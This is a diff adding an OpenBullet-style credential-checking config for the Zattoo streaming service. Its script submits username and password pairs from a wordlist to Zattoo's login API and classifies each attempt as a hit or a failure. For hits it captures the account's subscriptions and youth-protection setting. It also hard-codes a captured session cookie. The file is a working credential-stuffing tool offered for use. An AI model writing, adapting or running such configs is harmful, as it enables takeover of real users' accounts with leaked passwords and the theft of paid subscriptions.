@@ -1,0 +1,47 @@
+[SETTINGS]
+{
+  "Name": "Zatto.com",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-22T19:42:26.714132+02:00",
+  "AdditionalInfo": "",
+  "Author": "Acemy#7578",
+  "Version": "1.0.2",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://zapi0030.zattoo.com/zapi/v2/account/login" 
+  CONTENT "login=<USER>&password=<PASS>&remember=True" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "beaker.session.id: ebe66e4dc222fd82c78a8dd3b199e6088f29c260gAJ9cQEoVQhfZXhwaXJlc3ECiFUIYXBwX3ZlcnNxA1UIMy4xOTEyLjBxBFUJYWRfY291bnRzcQV9cQYoVQpwcmVzdGl0aWFsSwFVDm1vYmlsZS1tZWRyZWN0SwJ1VQZhcHBfaWRxB0seVQthZHNfYWxsb3dlZHEIiFUMY291bnRyeV9jb2RlcQl9cQooVQpnZW9ibG9ja2VkiVUMaXByYW5nZV9uYW1lTlUJcmVnaW9uX2lkTV4nVQJpcFUOMTc4LjIwMy4xNDYuODNVDGNvdW50cnlfY29kZVUCREVVA2V4cE5VBGdhaWRVAHVVBGlwdW9xC1UAVQZkZXZpY2VxDFUGaXBob25lcQ1VB3BhcnRuZXJxDlUMcGFydG5lcl96YXBpcQ9VDl9hY2Nlc3NlZF90aW1lcRBHQdcvfp0ztwtVCWxpbmV1cF9pZHERTVQxVQR1dWlkcRJVJDA4QTQ5NTlBLUQ4RjktNDE2Ny05M0U3LTNCNjlEQzJBMzUxN3ETVQhsYW5ndWFnZXEUVQJkZXEVVQpzZXNzaW9uX2lkcRZVQDAzMDVkYjUyZmRhM2Q2ZTExMjIyYWNkMGUzYWM5MDVlNzU4Y2IyZjg2ODc4ZmYzNGRkMTdmZjk1ZmYyNzJmMTFxF1UMemFwaV92ZXJzaW9ucRhLAlUEZHNpYXEZVSQ4MkU3OTkyMi05NTI0LTRERDgtQTlDNi1CQTY1QjcxRTIzNDZxGlUDX2lkcRtVIDRlODNlMWNmZWRiNzQ3YjI5ZDA5YzVlNDU3ZWNhMmFmcRxVDl9jcmVhdGlvbl90aW1lcR1HQdcvfh7jCl91Lg==; uid=W3tk0ly9+HsJEU0wCAYjAg==; zattoo.session=\"suQhshKKug3XmUipHXuujlIBUujBT3hmIB3KSl7WjP7BeSaeZVWR/tnQ+7tCvteDiQAkmDrbQlMR4lg3Yo/ckswDXofIWeTBIXmscfR/W4kE0g7DBUYdqim+Td6eDcwZ\"" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_0_1 like Mac OSX) Zattoo TV/3.1912.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Host: zapi0030.zattoo.com" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=utf-8" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"success\": true" 
+  KEYCHAIN Failure OR 
+    KEY "\"success\": false" 
+
+PARSE "<SOURCE>" LR "subscriptions\": " ", \"" -> CAP "Subscriptions" 
+
+PARSE "<SOURCE>" LR "protection_required\":" ", \"" -> VAR "Youth Protection Required" 
+
